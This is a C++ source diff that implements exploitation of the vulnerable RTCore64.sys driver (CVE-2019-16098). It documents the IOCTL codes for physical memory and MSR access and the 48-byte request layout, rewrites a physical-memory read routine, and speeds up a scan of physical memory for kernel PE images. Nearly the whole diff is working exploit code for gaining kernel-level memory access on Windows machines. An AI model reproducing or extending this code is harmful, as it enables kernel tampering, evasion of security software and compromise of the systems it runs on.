@@ -434,128 +434,94 @@ namespace sky::driver {
     // We detect which driver we're using based on the device handle
     // and use the appropriate IOCTL codes.
 
-    static DWORD s_ioctl_read  = 0;
-    static DWORD s_ioctl_write = 0;
-    static bool s_ioctl_tested = false;
+    // ============================================================
+    // RTCore64.sys physical memory access
+    // CVE-2019-16098 — verified from Barakat/CVE-2019-16098 PoC
+    // ============================================================
+    //
+    // IOCTL codes:
+    //   0x80002048 — Read physical memory
+    //   0x8000204c — Write physical memory
+    //   0x80002030 — Read MSR
+    //   0x80002034 — Write MSR
+    //
+    // CTL_CODE breakdown for 0x80002048:
+    //   DeviceType = 0x8000 (FILE_DEVICE_UNKNOWN)
+    //   Access     = 0 (FILE_ANY_ACCESS)
+    //   Function   = 0x812 (0x80002048 >> 2) & 0xFFF
+    //   Method     = 0 (METHOD_BUFFERED)
+    //
+    // Protocol (48-byte struct, METHOD_BUFFERED, same buffer for in/out):
+    //   Bytes  0-7:   Pad0     (reserved, zero)
+    //   Bytes  8-15:  Address  (physical address to read/write)
+    //   Bytes 16-23:  Pad1     (reserved, zero)
+    //   Bytes 24-27:  Size     (1, 2, or 4 — max 4 bytes per call!)
+    //   Bytes 28-31:  Value    (read result, or write data)
+    //   Bytes 32-47:  Pad2     (reserved, zero)
+    //   Total: 48 bytes
+    //
+    // CRITICAL: Read size is limited to 4 bytes per call.
+    // For larger reads, loop 4 bytes at a time.
 
-    // Test which IOCTL code works by reading a known physical address
-    static bool test_rtc_ioctl() {
-        if (s_ioctl_tested) return s_ioctl_read != 0;
-        s_ioctl_tested = true;
+    struct RTCoreRequest {
+        uint8_t  pad0[8];    // 0-7
+        uint64_t address;    // 8-15
+        uint8_t  pad1[8];    // 16-23
+        uint32_t size;       // 24-27. Must be 1, 2, or 4
+        uint32_t value;      // 28-31. Output: read data. Input: write data.
+        uint8_t  pad2[16];   // 32-47
+    };
+    static_assert(sizeof(RTCoreRequest) == 48, "RTCoreRequest must be 48 bytes");
 
-        DWORD codes[] = { 0x9C40258C, 0x9C402580, 0x9C406000, 0x9C40609C,
-                          0x222400, 0x222004, 0x9C402400 };
+    #define RTC_IOCTL_READ  0x80002048
+    #define RTC_IOCTL_WRITE 0x8000204C
+    #define RTC_IOCTL_READ_ALT  0x9C40258C  // fallback
 
-        for (auto code : codes) {
-            uint8_t buf[0x1000] = {};
-            DWORD returned = 0;
-
-            // Format A: [8 padding][8 address] — single buffer, same size for in/out
-            // RTCore64 requires InputBufferLength == OutputBufferLength for
-            // METHOD_BUFFERED (driver checks both >= sizeof(RTC_READ_INPUT))
-            {
-                memset(buf, 0, 16 + 0x100);
-                uint64_t* p = (uint64_t*)buf;
-                p[1] = 0x1000;
-
-                BOOL ok = DeviceIoControl(g_hwinfo_device, code,
-                    buf, 16 + 0x100,          // input: header + data space (same size as output)
-                    buf, 16 + 0x100,          // output: same
-                    &returned, nullptr);
-
-                if (!ok) {
-                    DWORD err = GetLastError();
-                    LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
-                        " Hdr failed (GLE=" + std::to_string(err) + ")");
-                } else {
-                    uint8_t* data = buf + 16;
-                    bool has_data = false;
-                    for (int i = 0; i < 16; i++) {
-                        if (data[i] != 0) { has_data = true; break; }
-                    }
-                    LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
-                        " Hdr ok (ret=" + std::to_string(returned) +
-                        " data=" + (has_data ? "yes" : "no") + ")");
-                    if (has_data || returned > 16) {
-                        s_ioctl_read = code;
-                        return true;
-                    }
-                }
-            }
-
-            // Format B: 8 bytes address only, separate output buffer
-            {
-                uint64_t addr = 0x1000;
-                uint8_t out[0x100] = {};
-                BOOL ok = DeviceIoControl(g_hwinfo_device, code,
-                    &addr, sizeof(addr),
-                    out, sizeof(out),
-                    &returned, nullptr);
-
-                if (!ok) {
-                    DWORD err = GetLastError();
-                    LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
-                        " Addr failed (GLE=" + std::to_string(err) + ")");
-                } else {
-                    bool has_data = false;
-                    for (int i = 0; i < 16; i++) {
-                        if (out[i] != 0) { has_data = true; break; }
-                    }
-                    LOG_INFO("read_physical: IOCTL 0x" + std::format("{:x}", code) +
-                        " Addr ok (ret=" + std::to_string(returned) +
-                        " data=" + (has_data ? "yes" : "no") + ")");
-                    if (has_data || returned > 0) {
-                        s_ioctl_read = code;
-                        return true;
-                    }
-                }
-            }
-        }
-
-        LOG_ERROR("read_physical: no working IOCTL found!");
-        return false;
-    }
+    static DWORD s_ioctl_read = RTC_IOCTL_READ;
 
     static bool read_physical(uintptr_t phys_addr, void* buffer, size_t size) {
         if (g_hwinfo_device == INVALID_HANDLE_VALUE) return false;
-        if (s_ioctl_read == 0) {
-            if (!test_rtc_ioctl()) return false;
-        }
 
-        DWORD returned = 0;
-        constexpr size_t MAX_READ = 0x1000;
+        uint8_t* dst = (uint8_t*)buffer;
         size_t remaining = size;
-        size_t off = 0;
+        uintptr_t addr = phys_addr;
+
         while (remaining > 0) {
-            size_t chunk = (remaining > MAX_READ) ? MAX_READ : remaining;
+            // Read up to 4 bytes at a time
+            uint32_t chunk = (remaining >= 4) ? 4 : (uint32_t)remaining;
 
-            // RTCore64 METHOD_BUFFERED format:
-            //   Input:  16 bytes header [8 reserved][8 address]
-            //   Output: 16 + chunk bytes [8 reserved][8 address][data]
-            uint8_t iobuf[0x1100] = {};
-            *(uint64_t*)(iobuf + 8) = (uint64_t)(phys_addr + off);
+            RTCoreRequest req = {};
+            req.address = addr;
+            req.size = chunk;  // 1, 2, or 4
 
+            DWORD returned = 0;
             BOOL ok = DeviceIoControl(g_hwinfo_device, s_ioctl_read,
-                iobuf, 16,                      // input: exactly 16 bytes
-                iobuf, 16 + (DWORD)chunk,       // output: 16 header + data
+                &req, sizeof(req),      // input: 48 bytes
+                &req, sizeof(req),      // output: same buffer
                 &returned, nullptr);
 
-            if (ok) {
-                // Data starts at offset 16 in output
-                memcpy((BYTE*)buffer + off, iobuf + 16, chunk);
-            } else {
-                // Fallback: try addr-only format (8 bytes input, separate output)
-                uint64_t addr = phys_addr + off;
-                ok = DeviceIoControl(g_hwinfo_device, s_ioctl_read,
-                    &addr, sizeof(addr),
-                    (BYTE*)buffer + off, (DWORD)chunk,
+            if (!ok) {
+                // Try alternate IOCTL code
+                ok = DeviceIoControl(g_hwinfo_device, RTC_IOCTL_READ_ALT,
+                    &req, sizeof(req),
+                    &req, sizeof(req),
                     &returned, nullptr);
-                if (!ok) return false;
             }
 
+            if (!ok) {
+                LOG_ERROR("read_physical: IOCTL failed at phys=0x" +
+                    std::format("{:x}", addr) + " GLE=" + std::to_string(GetLastError()));
+                return false;
+            }
+
+            // Copy result
+            memcpy(dst, &req.value, chunk);
+
+            addr += chunk;
+            dst += chunk;
             remaining -= chunk;
-            off += chunk;
         }
+
         return true;
     }
 
@@ -682,8 +648,17 @@ namespace sky::driver {
                 LOG_INFO("kernel scan: scanned " + std::to_string(pa >> 30) + "GB...");
                 next_progress += 0x100000000ULL;
             }
+
+            // PHASE 1: Fast MZ check (4 bytes only — avoids 1024 IOCTL calls per page)
+            uint32_t quick_sig = 0;
+            if (!read_physical((uintptr_t)pa, &quick_sig, sizeof(quick_sig))) continue;
+            // MZ = 0x4D5A (little-endian). In a uint32_t: first 2 bytes are 'M','Z'
+            if ((quick_sig & 0xFFFF) != 0x5A4D) continue;
+            // PE signature at offset 0x3C points to 'PE\0\0' which is 0x00004550
+            // We need to read 4 more bytes at offset 0x3C to get the pointer,
+            // then read 4 bytes at that pointer for 'PE\0\0'
+            // For now, just read the full page — only for MZ hits (rare)
             if (!read_physical((uintptr_t)pa, page, 0x1000)) continue;
-            if (page[0] != 'M' || page[1] != 'Z') continue;
 
             uint32_t pe_off;
             memcpy(&pe_off, page + 0x3C, sizeof(pe_off));
